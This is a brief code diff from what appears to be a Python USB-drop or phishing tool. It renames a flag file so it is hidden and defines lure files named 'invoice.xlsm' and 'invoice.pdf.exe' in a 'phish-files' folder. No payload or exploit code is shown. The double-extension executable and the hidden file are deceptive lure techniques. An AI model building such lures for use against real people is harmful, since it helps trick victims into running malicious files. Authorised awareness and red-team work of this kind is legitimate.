@@ -10,7 +10,7 @@ import subprocess
 import sys
 import time
 
-GUSB_FLAG_PATH = os.path.join(os.path.dirname(__file__), "phish-files/nodata.gusb")
+GUSB_FLAG_PATH = os.path.join(os.path.dirname(__file__), "phish-files/.nodata.gusb")
 EXCEL_MACRO_PATH = os.path.join(os.path.dirname(__file__), "phish-files/invoice.xlsm")
 EXECUTABLE_PATH = os.path.join(os.path.dirname(__file__), "phish-files/invoice.pdf.exe")
 USB_LABEL = "USB-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
